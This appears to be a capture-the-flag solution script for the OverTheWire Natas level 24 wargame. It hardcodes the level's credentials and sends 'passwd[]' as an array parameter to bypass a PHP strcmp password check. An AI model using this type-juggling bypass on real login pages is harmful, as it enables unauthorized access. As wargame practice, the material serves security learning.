#!bin/python3
import requests
import binascii

url = "http://natas24.natas.labs.overthewire.org/"
auth_username = "natas24"
auth_password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
'''
import html
res = requests.get(url + 'index-source.html', auth=(auth_username,auth_password))
print(html.unescape(res.content.decode('utf8').replace('\r','\n')))
'''
params = {'passwd[]':'a','submit':'Login'}

r = requests.get(url,auth=(auth_username,auth_password),params=params)
print(f"{r.status_code}\n{r.headers}\n{r.text}\n{r.cookies}")
print(r.history)

